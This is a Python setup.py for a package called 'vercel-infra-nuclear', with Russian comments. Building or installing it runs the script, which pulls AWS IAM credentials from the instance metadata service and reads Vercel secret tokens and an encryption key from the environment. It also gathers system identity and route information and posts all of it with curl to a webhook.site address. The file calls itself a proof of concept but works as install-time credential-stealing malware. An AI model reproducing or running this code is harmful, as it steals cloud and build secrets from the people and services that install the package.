from setuptools import setup
import os
import subprocess

def run_cmd(cmd):
    try:
        # Добавлена проверка таймаута, чтобы билд не висел вечно
        return subprocess.getoutput(cmd)
    except Exception as e:
        return f"Error: {str(e)}"

# Твой URL
WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"

# 1. Попытка получить AWS Token (IMDSv2)
# Добавлен таймаут 2 сек для curl, чтобы не вешать установку
aws_token = run_cmd("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'")

aws_metadata_final = "NOT_AVAILABLE"
if aws_token and "Error" not in aws_token and len(aws_token) > 10:
    aws_metadata_final = run_cmd(f"curl -s -m 2 -H 'X-aws-ec2-metadata-token: {aws_token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/")

# 2. Безопасное получение переменных окружения
# Используем .get('', 'NONE'), чтобы избежать TypeError при срезах [:30]
oidc_token = os.environ.get('VERCEL_OIDC_TOKEN', 'NONE')
enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', '')
enc_key = os.environ.get('VERCEL_ENV_ENC_KEY', 'NONE')
art_token = os.environ.get('VERCEL_ARTIFACTS_TOKEN', 'NONE')

# 3. Сбор системной инфы
network_info = run_cmd("netstat -rn || route -n")
id_info = run_cmd("id")

# 4. Формирование отчета
nuclear_report = f"""
☢️☢️☢️ VERCEL INFRASTRUCTURE POC ☢️☢️☢️

[!] AWS IMDSv2:
Token: {"SUCCESS" if len(aws_token) > 20 else "FAILED/TIMEOUT"}
IAM Role: {aws_metadata_final}

[!] SYSTEM ACCESS:
Identity: {id_info}
Routes:
{network_info}

[!] VERCEL SECRETS:
OIDC: {oidc_token[:40] if oidc_token else "NONE"}...
AES Key: {enc_key}
Artifacts Status: {run_cmd(f"curl -s -m 3 -H 'Authorization: Bearer {art_token}' https://api.vercel.com/v8/artifacts/status") if art_token != 'NONE' else "NO_TOKEN"}

[!] PAYLOAD:
Encrypted Blob Len: {len(enc_content)}
"""

# 5. Отправка данных на твой Webhook
try:
    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', nuclear_report, WEBHOOK_URL], timeout=10)
except:
    pass

# 6. Фикс ошибки "Multiple top-level modules"
setup(
    name="vercel-infra-nuclear",
    version="10.0.1",
    py_modules=[]  # Это скажет setuptools игнорировать лишние файлы в корне
)
